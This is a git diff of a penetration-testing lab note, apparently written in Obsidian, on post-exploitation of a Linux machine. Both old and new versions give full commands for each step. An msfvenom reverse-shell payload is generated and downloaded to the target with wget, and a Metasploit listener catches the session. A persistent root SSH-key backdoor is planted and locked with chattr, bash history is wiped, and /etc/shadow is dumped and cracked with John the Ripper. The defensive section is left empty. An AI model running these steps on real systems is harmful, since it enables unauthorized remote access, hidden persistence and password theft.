@@ -76,7 +76,9 @@ Now you could read files from the attacker `Kali linux`:
 
 ![[Pasted image 20250209200514.png]]
 
-## 3. Post-exploitation: Upload files to the target machine
+## 3. Post-exploitation
+
+### 3.1. Upload files to the target machine
 
 Use cases for uploading files:
 - Deploying Backdoors – Installing persistent malware.
@@ -101,12 +103,13 @@ In this example, it will be done the following:
 
 Generation of payload `reverse_tcp` with `msfvenon`:
 ```
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<AttackerIp> LPORT=<PortSelected> -f elf > tramp.elf
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<AttackerIp> LPORT=<PortSelected> -f elf -o hola
 ```
 
-`tramp.elf` will be generated with the payload `linux/x86/meterpreter/reverse_tcp`, and the configuration of the ip and port to send the reverse shell. The file is created in the current directory. 
+![[Pasted image 20250215104019.png]]
 
-![[Pasted image 20250214215255.png]]
+`hola` will be generated with the payload `linux/x86/meterpreter/reverse_tcp`, and the configuration of the ip and port to send the reverse shell. The file is created in the current directory. 
+![[Pasted image 20250215104057.png]]
 
 We need now a way to send the file to the target machine.
 
@@ -120,165 +123,145 @@ python -m http.server 80
 
 Download the file in the target machine from the attacker machine:
 ```
-wget http://<AttackerIp>/tramp.elf
+wget http://<AttackerIp>/hola
 ```
 
-![[Pasted image 20250214215801.png]]
+![[Pasted image 20250215104137.png]]
 
-![[Pasted image 20250214215612.png]]
-
-Listen in the attacker machine. Prepare Meterpreter listener:
-
+Listen in the attacker machine. The multi/handler module in Metasploit is used to catch and interact with incoming connections from payloads like reverse shells or Meterpreter sessions. It's commonly used with msfvenom-generated payloads. Prepare Meterpreter listener:
 ```
-sudo nc -nlvp <PortSelected>
+msfconsole
+use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST <AttackerIp>
+set LPORT <PortSelected>
+run
 ```
-![[Pasted image 20250214220154.png]]
-
-
 
 In the target machine run:
 ```
-chmod +x myscript.elf
-./myscript.elf
+chmod +x hola
+./hola
 ```
 
+In the attacker machine you will see the meterpreter session open with the reverse shell:
 
-
-
-
-
-The multi/handler module in Metasploit is used to catch and interact with incoming connections from payloads like reverse shells or Meterpreter sessions. It's commonly used with msfvenom-generated payloads.
-
-
-
-
-
-
-
-
+![[Pasted image 20250215104444.png]]
 
 ## 3. Post-exploitation: Maintaining Access
 
 After gaining access to a Linux system, **SSH key persistence** allows you to maintain access without relying on passwords or vulnerable services. This is commonly used in **post-exploitation** to create a stealthy backdoor.
 
-**Tool**: Metasploit **linux/manage/sshkey_persistence** module
-
-Background the meterpreter session with Ctrl Z to setup the sshkey_persistence module.
+### X. Generate the SSH Key
+In the attacker machine, we generate a SSH Key:
 
 ```
-use linux/manage/sshkey_persistence
-set SESSION 1
-set USERNAME <userWeFirstCompromised>
-set VERBOSE true
-run
-```
-
-## 2.2.3. Dumping User and Service Credentials
-
-7. Background the recent meterpreter session: **Ctrl Z**
-8. Using the linux hashdump module in Metasploit: **use post/linux/gather/hashdump; set SESSION 1; run**
-
-![](https://miro.medium.com/v2/resize:fit:1400/1*07Ga1LwNrQTabO5SeLopuw.png)
-
-User and service credentials dumped with Linux hashdump module.
-
-9. Cracking the credentials with John The Ripper: **john /path/to/.msf4/loot/2024…linux.hashes_270143.txt**
-
-**Note:** The path to the unshadowed password loot file from Metasploit is specified after running the Linux hashdump module.
-
-
-
-
-
-
-Step 1: Generate an SSH Key (Attacker Machine)
-
-On your Kali Linux or attacker machine, generate an SSH key:
-
+mkdir ssh
 ssh-keygen -t rsa -b 4096 -f ~/.ssh/persist_key
+```
 
+![[Pasted image 20250215111433.png]]
 This creates:
+- Private Key: ~/.ssh/persist_key (Keep this safe! It's the attacker backdoor.)
+- Public Key: ~/.ssh/persist_key.pub (To inject into the target.)
 
-    Private Key: ~/.ssh/persist_key (Keep this safe! It's your backdoor.)
-    Public Key: ~/.ssh/persist_key.pub (To inject into the target.)
+![[Pasted image 20250215111502.png]]
 
-Step 2: Transfer the Public Key to the Target
+### X. Upload the public SSH Key to the target machine
 
-Once you have shell access (Meterpreter, Netcat, or SSH), inject your public key into the target’s authorized_keys file.
-Method 1: Manually Append Key
+Transfer the public key to the target: (placed in root to maintain root access)
 
-Run:
-
-mkdir -p ~/.ssh
-echo "your_public_key_here" >> ~/.ssh/authorized_keys
-chmod 600 ~/.ssh/authorized_keys
-chmod 700 ~/.ssh
-
-or directly in one command:
-
-echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
-
-Method 2: Using Meterpreter
-
-If using Meterpreter, upload the public key:
-
+```
 upload persist_key.pub /root/.ssh/authorized_keys
+```
 
-Step 3: Maintain Root Access (Optional)
-
-If you want root persistence, place the key in /root/.ssh/authorized_keys:
-
-echo "your_public_key_here" >> /root/.ssh/authorized_keys
+![[Pasted image 20250215111820.png]]
 
 Ensure root login via SSH is enabled in /etc/ssh/sshd_config:
-
+```
 PermitRootLogin yes
+```
 
-Restart SSH:
+Restart SSH in the target machine:
 
-systemctl restart ssh
+```
+sudo /etc/init.d/ssh restart
+```
 
-Step 4: Connect Anytime
+![[Pasted image 20250215113357.png]]
 
-Now, you can SSH into the target without a password:
 
-ssh -i ~/.ssh/persist_key user@target_ip
+Check the port 
 
-For root access:
+![[Pasted image 20250215115813.png]]
 
+```
+sudo ufw allow 22
+```
+
+
+![[Pasted image 20250215121301.png]]
+### X. Connect any time
+
+```
 ssh -i ~/.ssh/persist_key root@target_ip
+```
+
+![[Pasted image 20250215133245.png]]
+
+```
+ssh -v -i ~/.ssh/persist_key -oHostKeyAlgorithms=ssh-rsa root@target_ip
+```
+
+![[Pasted image 20250215133412.png]]
+we do not know the user password
 
 
+```
+ssh -v -i ~/.ssh/persist_key -oHostKeyAlgorithms=ssh-rsa -oPubKeyAcceptedKeyTypes=ssh-rsa root@target_ip
+```
+
+![[Pasted image 20250215133514.png]]
 
 
-Step 5: Hide Your Tracks (Stealth)
+### X. Hide Your Tracks (Stealth)
 
 Make the SSH key hidden:
-
+```
 chmod 400 ~/.ssh/authorized_keys
 chattr +i ~/.ssh/authorized_keys  # Prevent deletion
+```
 
 To remove logs:
 
+```
 echo "" > ~/.bash_history
 history -c
-
-Bonus: Automating with a Script
-
-You can automate the persistence with a simple Bash script:
-
-#!/bin/bash
-mkdir -p ~/.ssh
-echo "your_public_key_here" >> ~/.ssh/authorized_keys
-chmod 600 ~/.ssh/authorized_keys
-chmod 700 ~/.ssh
-chattr +i ~/.ssh/authorized_keys
-
-Save it as persist.sh and run:
-
-bash persist.sh
+```
 
 
+## X. Dumping User and Service Credentials
+
+Get the content of the following files from the target machine:
+
+```
+/etc/shadow 
+/etc/passwd
+```
+
+Then use unshadow to merge them:
+```
+unshadow passwd shadow > hashes.txt
+```
+
+![[Pasted image 20250215164528.png]]
+
+Use John the Ripper
+```
+john hashes.txt
+```
+
+![[Pasted image 20250215164847.png]]
 
 
 Detection & Prevention (to be added in the defensive measurements)
